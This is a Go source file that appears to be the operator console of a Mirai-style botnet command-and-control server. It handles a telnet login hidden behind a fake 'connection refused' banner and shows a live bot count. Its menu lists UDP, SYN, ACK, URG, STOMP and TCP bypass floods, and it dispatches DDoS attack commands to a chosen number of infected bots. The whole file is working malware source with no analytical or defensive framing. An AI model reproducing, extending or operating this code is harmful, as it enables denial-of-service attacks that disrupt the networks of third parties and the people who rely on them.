package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))
    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("远程登录: Unable to connect to remote host: 连接 refused. 错误\r\n"))
    this.conn.Write([]byte(""))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte(""))
    password, err := this.ReadLine(false)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\033[00;31m\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Loaded\007", BotCount))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
	
	this.conn.Write([]byte("\033[2J\033[1H"))

    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[93m"+ username +"\033[31m@\033[93mbotnet\033[31m: \033[97m"))
        cmd, err := this.ReadLine(false)
        
        if cmd == "clear" || cmd == "cls" {
        this.conn.Write([]byte("\033[2J\033[1;1H\r\n\r\n"))
            continue
        }
        
        if userInfo.admin == 1 && cmd == "bots" || cmd == "botcount" || cmd == "botcounts" {
        botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[39m%s\033[91m: \033[39m%d\033[0m\r\n", k, v)))
            }
            continue
        }
        

        if userInfo.admin == 0 && cmd == "bots" || cmd == "botcount" || cmd == "botcounts" {
            continue
        }

        if cmd == "?" || cmd == "help" {
            this.conn.Write([]byte("\033[0mVolumetric floods\r\n"))
            this.conn.Write([]byte("\033[93mudpflood\033[31m: \033[97mUDP Flood.\r\n"))
            this.conn.Write([]byte("\033[93mrawflood\033[31m: \033[97mRaw UDP Flood.\r\n"))
            this.conn.Write([]byte("\033[93mackflood\033[31m: \033[97mACK Flood.\r\n"))
            this.conn.Write([]byte("\033[93murgflood\033[31m: \033[97mURG Flood.\r\n"))
            this.conn.Write([]byte("\033[93msynflood\033[31m: \033[97mSyn Flood.\r\n"))
            this.conn.Write([]byte("\033[93mtcpbypass\033[31m: \033[97mTCP Bypass Flood.\r\n"))
            this.conn.Write([]byte("\033[93mudpplain\033[31m: \033[97mPlain UDP Flood.\r\n"))
            this.conn.Write([]byte("\033[93mstompflood\033[31m: \033[97mStomp Flood.\r\n"))
            continue
        }
        if cmd == "" {
            continue
        }

        botCount = userInfo.maxBots

        if cmd[0] == '°' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '°' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                    var AttackCount int
                    if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                        AttackCount = userInfo.maxBots
                    } else {
                        AttackCount = clientList.Count()
                    }
                    this.conn.Write([]byte(fmt.Sprintf("\033[32mCommand sent to %d bots and is taking up slot 1\r\n", AttackCount)))
                } else {
                    // no whitelist.
                    // his.conn.Write([]byte(f))
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 500000)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == 0x08 {
            this.conn.Write([]byte("\b"))
                return "", nil 
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}